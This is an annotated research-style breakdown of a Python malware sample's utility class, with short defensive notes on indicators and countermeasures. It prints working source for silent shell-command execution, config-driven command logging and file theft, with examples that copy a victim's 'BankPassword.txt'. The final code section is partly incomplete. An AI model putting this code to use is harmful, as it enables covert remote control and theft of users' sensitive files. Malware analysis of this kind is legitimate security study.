'''
        🎨 Diagram: Component Interaction


 +---------------------+        +---------------------+
 |   Configuration     |        |    Communication    |
 |   (JSON Settings)   |        | (Talks to C2 Server)|
 +----------+----------+        +----------+----------+
            |                            |
            v                            v
 +---------------------+       +----------------------+
 |       Util.py       |<----->|   Screenshot/Keylog  |
 |   File ops, shell    |       |   + WindowTracker    |
 +---------------------+       +----------------------+

 📚 Summary Table
____________________________________________________________________________________________
| Function                | Purpose                    | Malicious Use Case                 \ 
| ----------------------- | -------------------------- | ---------------------------------- |
| `fileOut()`             | Logging data               | Save keystrokes, window titles     |
| `jsonIn()`              | Load remote configs        | Load attacker instructions         |
| `executeShellCommand()` | Execute system commands    | Dump system info (IP, users, etc.) |
| `extractShellData()`    | Run and log command output | Exfiltrate data silently           |
| `stealFile()`           | Copy target files          | Extract sensitive documents        |
\___________________________________________________________________________________________/

🎯 Purpose of Util Class
The Util class is a utility/helper class that supports the main Configuration class. It provides:
1. File I/O (writing logs).
2. Reading JSON config files.
3. Executing system commands (remote shell).
4. Data exfiltration (stealing files from victim’s machine).

🧩 Section 1: fileOut() – Logging to a File

🔍 Functionality
- Writes data to a file specified by file
- Default mode is append (a), allowing for log accumulation
- Handles exceptions silently (prints basic error)

📘 Example Use
Util.fileOut("C:/Users/User/AppData/Roaming/tempData/log.txt", "Key: A")
📁 Creates/updates a file to store keylogging output like:
Key: A
Key: B
Key: Enter

🧩 Section 2: jsonIn() – Load Config from File

  @staticmethod
  def jsonIn(file) -> str:
      with open(file=file, mode='r') as FILE:
          return loads(FILE.readlines()[0])
🔍 Functionality
- Opens and reads a single-line JSON file.
- Parses it into a Python dict using json.loads().

🧪 Example config.json:

{"debug": true, "keyloggingIsActive": true, "ftpurl": "ftp://example.com"}

📘 Usage:

config = Util.jsonIn("C:/Users/User/AppData/Roaming/tempData/config.json")
print(config["ftpurl"])  # ftp://example.com

📊 Diagram – Config Load Flow

pgsql

+------------------------+
| config.json (on disk) |
+------------------------+
             |
             v
  [jsonIn()] → dict → passed to Configuration





🧩 Section 3: executeShellCommand() – Remote Command Execution
  @staticmethod
  def executeShellCommand(command:str) -> str:
      result = ''
      try:
          result = check_output(command, shell=True, encoding='437')
      except Exception as error:
          result = error
      return result

🔍 Functionality
- Executes a command using cmd.exe (shell=True).
- Encoding 437 is legacy Windows DOS encoding.

🧪 Example
           example file in python
           
Util.executeShellCommand("dir C:\\Users\\User\\Desktop")

📄 Returns output like:

 Volume in drive C is Windows
 Directory of C:\Users\User\Desktop
...

💀 Malware Use
- Could run any command remotely (e.g., downloading files, shutting down the system).

🧩 Section 4: extractShellData() – Save Shell Output

  @staticmethod
  def extractShellData(logPath, shellCommand:str):
      if shellCommand:
          try:
              result = Util.executeShellCommand(shellCommand)
              Util.fileOut(logPath + 'shell.txt', result, 'w')
              print('Shell command executed!')
          except Exception:
              print('shellcommand error')

🔍 Functionality
- Runs a shell command passed from configuration.
- Logs the result into shell.txt.
🧪 Example
If shellCommand = "ipconfig /all":

📁 Writes shell.txt to:

example file in swift

C:/Users/User/AppData/Roaming/tempData/shell.txt

🧾 Example contents:

Windows IP Configuration

   Host Name . . . . . . . . . . . . : USER-PC
   DNS Servers . . . . . . . . . . . : 192.168.1.1

🧩 Section 5: stealFile() – File Exfiltration

  @staticmethod
  def stealFile(logPath, stealPath:str):
      if stealPath:
          try:
              filename = stealPath.split('\\')[-1]
              copy2(stealPath, logPath + filename)
              print('File has been stolen!')
          except Exception as error:
              print('stealfile: ',error)

🔍 Functionality
- Takes a file from a victim-specified path.
- Copies it to the malware's log directory (logPath).
- Uses shutil.copy2() to preserve metadata (timestamps).




📘 Example (python)
stealPath = "C:\\Users\\User\\Documents\\BankPassword.txt"
logPath = "C:\\Users\\User\\AppData\\Roaming\\tempData\\"

Util.stealFile(logPath, stealPath)

📁 Copied file path: (swift)
C:/Users/User/AppData/Roaming/tempData/BankPassword.txt

🧠 Overall Util Class Diagram (diff)
+------------------------+
|        Util           |
+------------------------+
| + fileOut()            |
| + jsonIn()             |
| + executeShellCommand()|
| + extractShellData()   |
| + stealFile()          |
+------------------------+
🔁 Usage Sequence:

1. Load config: jsonIn()

2. If remote command: extractShellData()

3. If file target: stealFile()

4. Log everything: fileOut()

🧾 Summary Table
| Method                  | Purpose                      | Threat Vector                   |
| ----------------------- | ---------------------------- | ------------------------------- |
| `fileOut()`             | Log data to a file           | Log keypresses, commands        |
| `jsonIn()`              | Load JSON config             | Dynamic reconfiguration         |
| `executeShellCommand()` | Run system commands silently | Remote command execution        |
| `extractShellData()`    | Save command result to disk  | Capture environment/system info |
| `stealFile()`           | Copy sensitive files         | Exfiltrate passwords, documents |

🎓 Academic Notes & Defense Considerations

🔍 Malware Indicators (IoCs)

- File creation in AppData\\Roaming
- Startup folder manipulation
- FTP/Web callbacks
- Use of cmd with encoded output

🔐 Countermeasures
- Restrict PowerShell/CMD execution policies
- Endpoint Detection & Response (EDR) tools
- Monitoring file access in AppData
- Prevent file exfiltration using DLP software

✅ Final Notes for Research Report
You now have a complete annotated breakdown of the Util class in this malware sample:
- Each method is tied to a specific malicious behavior.
- It's designed for remote control, surveillance, and data theft.
- Used in combination with the earlier Configuration class for modular deployment.

If you'd like:
📊 Network flow illustrations
🛡️ Defensive coding or detection scripts
📚 Academic references for citations (CVE, MITRE ATT&CK, etc.)

'''






################################################################################################################################
# This utility module plays a crucial role in supporting the other components in
# the surveillance or malware system
# That we are analyzing for your research assignment.
################################################################################################################################
# 📄 Util.py — Utility Functions for Surveillance/Malware Operations
################################################################################################################################
# ✅ Purpose: This module defines a set of static helper methods that are reused across the entire system. 
################################################################################################################################
# These methods handle:
# - Writing to log files.
# - Reading configuration files (JSON).
# - Executing shell commands.
# - Copying/stealing files from a target machine.

################################################################################################################################
# 🔍 Code Breakdown (Line-by-Line Explanation)
################################################################################################################################

from subprocess import check_output # subprocess.check_output - Executes shell commands and capures the output
from json import loads # json.loads - Converts a JSON-formatted string to a Python dictionary
from shutil import copy, copy2 # shutil.copy, shutil.copy2: Used for copying files. copy2 preserves metadata (e.g., timestamps).

#####################################################################################################################
# All methods are @staticmethod, meaning they can be used without creating an object of the class.
#####################################################################################################################

class Util:

#####################################################################################################################
# A container for utility functions, all of which are @staticmethods, 
# they can be used without creating an instance of the clas
####################################################################################################################

  
  # 1. 📁 fileOut(file: str, data: str, mode='a')
  @staticmethod
  def fileOut(file:str, data:str, mode='a') -> None: # mode 'a' stands for append, 'w' is overwrite and 'r' is read-pnly
    try:
      with open(file=file, mode=mode, encoding='UTF-8') as FILE:
        FILE.write(str(data))
    except Exception:
      print('fileOut error!')
  # 📌 What it does:
    # - Appends or writes data to a file.
    # - Takes in the file path, data, and mode (default is append 'a').
  # 🧠 Use Case:
    # - Writing logs
    # - Saving shel command output
    # - Dumping JSON from server

#######################################################################################################################
#📘 Example Use:
# Util.fileOut("log.txt", "Keystroke: A")
################################################################################################# 
# 🖼 Illustration: 
# [Data] --> [fileOut()] --> "log.txt"
#####################################################################################################


  
  # 2.  📄 jsonIn(file) -> str
  
  @staticmethod
  def jsonIn(file) -> str:
    with open(file=file, mode='r') as FILE:
      return loads(FILE.readlines()[0])
      
  # 📌 What it does:
    # - Reads a JSON file and returns a Python dictionary.
    # - Reads the first line from a .json file.
    # - Converts the JSON string into a Python dictionary.
    # - Assumes all JSON data is in the first line of the file.
    # ⚠️ Assumes JSON is a single line.
  
   # 🧠 Use Case:
    # - Used by the Configuration class to read config.json from the server.


  

  # 📌 What it does:
  #  - RUns a shel command using windows command prompt (cmd.exe)
  # - Executes a Windows shell command.
  # - Returns output as a string.
  # - Uses encoding 437 (OEM United States) — compatible with cmd.exe.

# 🧠 Use Case:
 # Used to run commands like:
  # - bash
  # - Copy
  # - Edit
  # - ipconfig
  # - netstat
  # - tasklist
#################################################################################################################

  # 4. extractShellData(logPath, shellCommand: str)
